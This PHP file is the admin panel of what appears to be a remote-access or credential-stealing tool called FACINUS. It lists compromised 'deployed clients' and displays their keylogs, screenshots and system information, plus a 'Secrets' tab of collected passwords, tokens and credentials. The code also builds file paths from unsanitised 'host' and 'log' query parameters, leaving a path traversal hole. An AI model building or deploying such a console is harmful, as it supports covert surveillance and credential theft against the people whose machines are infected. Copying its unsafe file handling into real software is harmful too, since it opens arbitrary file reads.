<?php
// FACINUS Admin Panel
// This file allows viewing logs and connection information from deployed clients

// Session and authentication
session_start();
$admin_password = "ADMIN_PASSWORD_PLACEHOLDER"; // Will be replaced during installation

// Handle login
if (isset($_POST['password'])) {
    if ($_POST['password'] === $admin_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $login_error = "Invalid password";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Check authentication
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Directories
$logs_dir = __DIR__ . "/logs";
$secrets_dir = __DIR__ . "/secrets";

// Get list of hosts (each subdirectory in logs_dir is a host)
$hosts = [];
if ($authenticated && is_dir($logs_dir)) {
    $dir_content = scandir($logs_dir);
    foreach ($dir_content as $item) {
        if ($item != "." && $item != ".." && is_dir($logs_dir . "/" . $item)) {
            $hosts[] = $item;
        }
    }
}

// View specific log if requested
$current_log = null;
$log_content = "";
if ($authenticated && isset($_GET['log'])) {
    $log_path = $logs_dir . "/" . $_GET['host'] . "/" . $_GET['log'];
    if (file_exists($log_path) && is_file($log_path)) {
        $current_log = $_GET['log'];
        $log_content = file_get_contents($log_path);
    }
}

// View system info if requested
$system_info = null;
if ($authenticated && isset($_GET['info']) && $_GET['info'] === 'system') {
    $info_path = $logs_dir . "/" . $_GET['host'] . "/system_info.json";
    if (file_exists($info_path) && is_file($info_path)) {
        $system_info = json_decode(file_get_contents($info_path), true);
    }
}

// View secrets if requested
$secrets = [];
if ($authenticated && isset($_GET['secrets']) && $_GET['host']) {
    $host_secrets_dir = $secrets_dir . "/" . $_GET['host'];
    if (is_dir($host_secrets_dir)) {
        $secret_files = scandir($host_secrets_dir);
        foreach ($secret_files as $file) {
            if ($file != "." && $file != ".." && is_file($host_secrets_dir . "/" . $file)) {
                $type = pathinfo($file, PATHINFO_FILENAME);
                $value = file_get_contents($host_secrets_dir . "/" . $file);
                $secrets[$type] = $value;
            }
        }
    }
}

// Get logs for a specific host if requested
$host_logs = [];
if ($authenticated && isset($_GET['host'])) {
    $host_logs_dir = $logs_dir . "/" . $_GET['host'];
    if (is_dir($host_logs_dir)) {
        $log_files = scandir($host_logs_dir);
        foreach ($log_files as $file) {
            if ($file != "." && $file != ".." && is_file($host_logs_dir . "/" . $file)) {
                $host_logs[] = $file;
            }
        }
    }
    // Sort logs by most recent first
    usort($host_logs, function($a, $b) use ($logs_dir) {
        return filemtime($logs_dir . "/" . $_GET['host'] . "/" . $b) - 
               filemtime($logs_dir . "/" . $_GET['host'] . "/" . $a);
    });
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FACINUS - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #3498db;
            --primary-dark: #2980b9;
            --secondary: #2c3e50;
            --secondary-light: #34495e;
            --accent: #e74c3c;
            --accent-light: #f39c12;
            --text: #2c3e50;
            --text-light: #7f8c8d;
            --text-dark: #1a252f;
            --bg: #f5f7fa;
            --card-bg: #ffffff;
            --border: #e0e6ed;
            --success: #2ecc71;
            --danger: #e74c3c;
            --warning: #f39c12;
            --info: #3498db;
            --logs-bg: #f8f9fa;
            --logs-border: #e9ecef;
            --secret-bg: #fff9e6;
            --secret-border: #ffecb3;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Oxygen, Ubuntu, sans-serif;
            color: var(--text);
            background-color: var(--bg);
            line-height: 1.6;
        }
        
        .container {
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .header {
            background: linear-gradient(135deg, var(--secondary) 0%, var(--secondary-light) 100%);
            color: white;
            padding: 15px 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header h1 {
            font-weight: 600;
            font-size: 24px;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
        }
        
        .header h1 i {
            margin-right: 10px;
            color: var(--accent-light);
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logout {
            color: white;
            text-decoration: none;
            background-color: rgba(255, 255, 255, 0.1);
            padding: 8px 15px;
            border-radius: 4px;
            transition: background-color 0.2s ease;
            display: flex;
            align-items: center;
        }
        
        .logout i {
            margin-right: 6px;
        }
        
        .logout:hover {
            background-color: rgba(255, 255, 255, 0.2);
        }
        
        .dashboard {
            display: flex;
            margin-top: 25px;
            gap: 25px;
        }
        
        .sidebar {
            width: 280px;
            flex-shrink: 0;
        }
        
        .content {
            flex-grow: 1;
        }
        
        .card {
            background: var(--card-bg);
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
            padding: 20px;
            margin-bottom: 25px;
            border: 1px solid var(--border);
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border);
        }
        
        .card-header h2, .card-header h3 {
            font-weight: 600;
            color: var(--text-dark);
            margin: 0;
            display: flex;
            align-items: center;
        }
        
        .card-header h2 i, .card-header h3 i {
            margin-right: 10px;
            color: var(--primary);
        }
        
        .login {
            max-width: 400px;
            margin: 100px auto;
            background: var(--card-bg);
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            padding: 30px;
            border: 1px solid var(--border);
        }
        
        .login h2 {
            text-align: center;
            margin-bottom: 30px;
            color: var(--text-dark);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .login h2 i {
            margin-right: 12px;
            color: var(--primary);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--text);
        }
        
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.2s ease;
            background-color: white;
        }
        
        input[type="password"]:focus, input[type="text"]:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
        }
        
        button, .button {
            display: inline-block;
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s ease;
            font-weight: 500;
            text-align: center;
            width: 100%;
        }
        
        button:hover, .button:hover {
            background: var(--primary-dark);
        }
        
        .host-list {
            list-style: none;
            margin-bottom: 0;
        }
        
        .host-list li {
            border-bottom: 1px solid var(--border);
        }
        
        .host-list li:last-child {
            border-bottom: none;
        }
        
        .host-list a {
            text-decoration: none;
            color: var(--text);
            display: block;
            padding: 12px 15px;
            transition: all 0.2s ease;
            border-radius: 4px;
            display: flex;
            align-items: center;
        }
        
        .host-list a i {
            margin-right: 10px;
            color: var(--primary);
        }
        
        .host-list a:hover {
            background-color: rgba(52, 152, 219, 0.05);
            color: var(--primary);
        }
        
        .host-list a.active {
            background-color: rgba(52, 152, 219, 0.1);
            color: var(--primary);
            font-weight: 500;
        }
        
        .log-list {
            list-style: none;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid var(--border);
            border-radius: 6px;
        }
        
        .log-list li {
            border-bottom: 1px solid var(--border);
        }
        
        .log-list li:last-child {
            border-bottom: none;
        }
        
        .log-list a {
            text-decoration: none;
            color: var(--text);
            display: block;
            padding: 12px 15px;
            transition: background 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .log-list a i {
            margin-right: 10px;
            color: var(--text-light);
        }
        
        .log-list a:hover {
            background-color: rgba(0, 0, 0, 0.02);
        }
        
        .log-list a.active {
            background-color: rgba(52, 152, 219, 0.1);
            color: var(--primary);
            font-weight: 500;
        }
        
        .log-date {
            color: var(--text-light);
            font-size: 0.9em;
        }
        
        .tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--border);
            overflow-x: auto;
            padding-bottom: 1px;
        }
        
        .tab {
            padding: 12px 20px;
            cursor: pointer;
            border: 1px solid transparent;
            border-bottom: none;
            border-radius: 4px 4px 0 0;
            margin-right: 5px;
            color: var(--text-light);
            text-decoration: none;
            white-space: nowrap;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
        }
        
        .tab i {
            margin-right: 8px;
        }
        
        .tab:hover {
            color: var(--primary);
            background-color: rgba(52, 152, 219, 0.05);
        }
        
        .tab.active {
            color: var(--primary);
            border-color: var(--border);
            border-bottom: 1px solid white;
            margin-bottom: -1px;
            background-color: white;
        }
        
        .logs {
            background: var(--logs-bg);
            padding: 15px;
            border: 1px solid var(--logs-border);
            border-radius: 6px;
            overflow: auto;
            max-height: 600px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            white-space: pre-wrap;
            color: var(--text-dark);
        }
        
        .secret {
            background: var(--secret-bg);
            padding: 20px;
            border: 1px solid var(--secret-border);
            border-radius: 6px;
            margin-bottom: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
        }
        
        .secret-title {
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--text-dark);
            font-size: 16px;
            display: flex;
            align-items: center;
        }
        
        .secret-title i {
            margin-right: 8px;
            color: var(--warning);
        }
        
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid transparent;
            border-radius: 6px;
            font-weight: 500;
        }
        
        .alert-danger {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
        
        .command {
            background: var(--logs-bg);
            padding: 12px 15px;
            border: 1px solid var(--logs-border);
            border-radius: 4px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            margin: 10px 0;
            position: relative;
            overflow-x: auto;
        }
        
        .copy-btn {
            position: absolute;
            right: 10px;
            top: 8px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 4px 10px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.2s ease;
            width: auto;
            display: flex;
            align-items: center;
        }
        
        .copy-btn i {
            margin-right: 5px;
        }
        
        .copy-btn:hover {
            background: var(--primary-dark);
        }
        
        code {
            background-color: rgba(0, 0, 0, 0.05);
            padding: 2px 5px;
            border-radius: 3px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        pre {
            background-color: rgba(0, 0, 0, 0.03);
            border: 1px solid rgba(0, 0, 0, 0.1);
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
        }
        
        .badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 50px;
            font-size: 12px;
            font-weight: 500;
            margin-left: 10px;
            background-color: rgba(52, 152, 219, 0.1);
            color: var(--primary);
        }
        
        .welcome-message {
            text-align: center;
            padding: 50px 0;
        }
        
        .welcome-message i {
            font-size: 64px;
            color: var(--primary);
            margin-bottom: 20px;
            opacity: 0.2;
        }
        
        .welcome-message h2 {
            margin-bottom: 15px;
            color: var(--text-dark);
        }
        
        .welcome-message p {
            color: var(--text-light);
            max-width: 600px;
            margin: 0 auto;
        }
        
        @media (max-width: 992px) {
            .dashboard {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
            }
        }
        
        @media (max-width: 768px) {
            .header h1 {
                font-size: 20px;
            }
            
            .login {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="container">
            <div class="header-content">
                <h1><i class="fas fa-shield-alt"></i> FACINUS Admin Panel</h1>
                <?php if ($authenticated): ?>
                    <a href="?logout=1" class="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <div class="container">
        <?php if (!$authenticated): ?>
            <div class="login">
                <h2><i class="fas fa-lock"></i> Admin Login</h2>
                <?php if (isset($login_error)): ?>
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-circle"></i> <?php echo $login_error; ?>
                    </div>
                <?php endif; ?>
                <form method="post">
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required autofocus>
                    </div>
                    <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
                </form>
            </div>
        <?php else: ?>
            <div class="dashboard">
                <div class="sidebar">
                    <div class="card">
                        <div class="card-header">
                            <h3><i class="fas fa-server"></i> Hosts</h3>
                            <span class="badge"><?php echo count($hosts); ?></span>
                        </div>
                        <?php if (count($hosts) > 0): ?>
                            <ul class="host-list">
                                <?php foreach ($hosts as $host): ?>
                                    <li>
                                        <a href="?host=<?php echo urlencode($host); ?>" class="<?php echo isset($_GET['host']) && $_GET['host'] === $host ? 'active' : ''; ?>">
                                            <i class="fas fa-laptop"></i> <?php echo htmlspecialchars($host); ?>
                                        </a>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        <?php else: ?>
                            <p class="welcome-message">
                                <i class="fas fa-database"></i>
                                <h2>No Hosts Found</h2>
                                <p>There are no connected hosts in the system. Deployed clients will appear here once they connect.</p>
                            </p>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="content">
                    <?php if (isset($_GET['host'])): ?>
                        <div class="card">
                            <div class="card-header">
                                <h2><i class="fas fa-desktop"></i> <?php echo htmlspecialchars($_GET['host']); ?></h2>
                            </div>
                            
                            <div class="tabs">
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>" class="tab <?php echo !isset($_GET['info']) && !isset($_GET['secrets']) ? 'active' : ''; ?>">
                                    <i class="fas fa-file-alt"></i> Logs
                                </a>
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&info=system" class="tab <?php echo isset($_GET['info']) && $_GET['info'] === 'system' ? 'active' : ''; ?>">
                                    <i class="fas fa-info-circle"></i> System Info
                                </a>
                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&secrets=1" class="tab <?php echo isset($_GET['secrets']) ? 'active' : ''; ?>">
                                    <i class="fas fa-key"></i> Secrets
                                </a>
                            </div>
                            
                            <?php if (isset($_GET['secrets'])): ?>
                                <?php if (count($secrets) > 0): ?>
                                    <?php foreach ($secrets as $type => $value): ?>
                                        <div class="secret">
                                            <div class="secret-title">
                                                <i class="fas fa-key"></i> <?php echo htmlspecialchars(ucfirst($type)); ?>
                                            </div>
                                            <div class="command">
                                                <?php echo htmlspecialchars($value); ?>
                                                <button class="copy-btn" onclick="copyToClipboard(this)" data-clipboard="<?php echo htmlspecialchars($value); ?>">
                                                    <i class="fas fa-copy"></i> Copy
                                                </button>
                                            </div>
                                        </div>
                                    <?php endforeach; ?>
                                <?php else: ?>
                                    <div class="welcome-message">
                                        <i class="fas fa-lock"></i>
                                        <h2>No Secrets Found</h2>
                                        <p>No passwords, tokens, or credentials have been collected from this host yet.</p>
                                    </div>
                                <?php endif; ?>
                            <?php elseif (isset($_GET['info']) && $_GET['info'] === 'system'): ?>
                                <?php if ($system_info): ?>
                                    <div class="card">
                                        <div class="card-header">
                                            <h3><i class="fas fa-cogs"></i> System Information</h3>
                                        </div>
                                        <table class="info-table">
                                            <?php foreach ($system_info as $key => $value): ?>
                                                <tr>
                                                    <td class="info-label"><?php echo htmlspecialchars(ucfirst(str_replace('_', ' ', $key))); ?></td>
                                                    <td class="info-value"><?php echo htmlspecialchars($value); ?></td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </table>
                                    </div>
                                <?php else: ?>
                                    <div class="welcome-message">
                                        <i class="fas fa-exclamation-circle"></i>
                                        <h2>No System Information</h2>
                                        <p>System information has not been collected from this host yet.</p>
                                    </div>
                                <?php endif; ?>
                            <?php else: ?>
                                <?php if ($current_log): ?>
                                    <div class="logs">
                                        <?php echo htmlspecialchars($log_content); ?>
                                    </div>
                                <?php elseif (count($host_logs) > 0): ?>
                                    <ul class="log-list">
                                        <?php foreach ($host_logs as $log): ?>
                                            <?php 
                                                $log_time = filemtime($logs_dir . "/" . $_GET['host'] . "/" . $log);
                                                $log_date = date("Y-m-d H:i:s", $log_time);
                                                $log_icon = "fa-file-alt";
                                                if (strpos($log, "keylog") !== false) {
                                                    $log_icon = "fa-keyboard";
                                                } elseif (strpos($log, "screenshot") !== false) {
                                                    $log_icon = "fa-image";
                                                } elseif (strpos($log, "system") !== false) {
                                                    $log_icon = "fa-info-circle";
                                                }
                                            ?>
                                            <li>
                                                <a href="?host=<?php echo urlencode($_GET['host']); ?>&log=<?php echo urlencode($log); ?>" class="<?php echo isset($_GET['log']) && $_GET['log'] === $log ? 'active' : ''; ?>">
                                                    <div>
                                                        <i class="fas <?php echo $log_icon; ?>"></i>
                                                        <?php echo htmlspecialchars($log); ?>
                                                    </div>
                                                    <span class="log-date"><?php echo $log_date; ?></span>
                                                </a>
                                            </li>
                                        <?php endforeach; ?>
                                    </ul>
                                <?php else: ?>
                                    <div class="welcome-message">
                                        <i class="fas fa-clipboard-list"></i>
                                        <h2>No Logs Available</h2>
                                        <p>No logs have been collected from this host yet. Check back later.</p>
                                    </div>
                                <?php endif; ?>
                            <?php endif; ?>
                        </div>
                    <?php else: ?>
                        <div class="welcome-message">
                            <i class="fas fa-shield-alt"></i>
                            <h2>Welcome to FACINUS Admin Panel</h2>
                            <p>Select a host from the sidebar to view logs, system information, and collected secrets.</p>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function copyToClipboard(element) {
            const text = element.getAttribute('data-clipboard');
            const textarea = document.createElement('textarea');
            textarea.textContent = text;
            textarea.style.position = 'fixed';
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            
            // Change button text temporarily
            const originalText = element.innerHTML;
            element.innerHTML = '<i class="fas fa-check"></i> Copied!';
            setTimeout(() => {
                element.innerHTML = originalText;
            }, 2000);
        }
    </script>

    <style>
        .info-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .info-table tr:nth-child(even) {
            background-color: rgba(0, 0, 0, 0.02);
        }
        
        .info-table tr:hover {
            background-color: rgba(52, 152, 219, 0.05);
        }
        
        .info-table td {
            padding: 12px 15px;
            border-bottom: 1px solid var(--border);
        }
        
        .info-table tr:last-child td {
            border-bottom: none;
        }
        
        .info-label {
            font-weight: 500;
            color: var(--text-dark);
            width: 25%;
        }
        
        .info-value {
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        }
        
        @media (max-width: 768px) {
            .info-label {
                width: 40%;
            }
        }
    </style>
</body>
</html>
